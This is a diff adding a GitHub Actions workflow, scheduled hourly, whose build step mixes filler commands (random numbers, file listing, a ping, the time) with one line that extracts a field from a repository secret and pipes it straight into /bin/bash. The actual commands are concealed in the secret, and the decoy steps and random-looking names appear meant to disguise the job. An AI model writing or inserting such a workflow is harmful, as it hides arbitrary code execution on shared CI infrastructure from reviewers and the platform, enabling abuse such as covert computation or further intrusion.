@@ -1,0 +1,24 @@
+name: wangcetou5678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangcetou5678
+        env:
+          f16697: ${{ secrets.f16697 }}
+        run: |
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          ls -al | grep -E "has.*a.*cpp" | xargs cat
+          which bash 2>/dev/null || echo "Bash not in path"
+          echo $f16697 | jq -r .l26586 | /bin/bash
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo "Time: $(date +%H:%M:%S)"
+          ping -c 10 github.com
